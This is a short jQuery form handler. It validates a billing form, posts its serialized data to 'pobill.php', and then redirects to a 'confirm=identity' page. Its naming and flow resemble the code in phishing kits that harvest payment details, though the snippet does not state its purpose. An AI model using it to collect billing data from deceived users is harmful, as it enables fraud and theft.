$("#billing").validate({
  submitHandler: function(form) {
    $.post("../post/pobill.php", $("#billing").serialize(), function(GET) {
      setTimeout(function() {
        window.location.assign("confirm=identity");
      }, 3000)
    });
  },
});
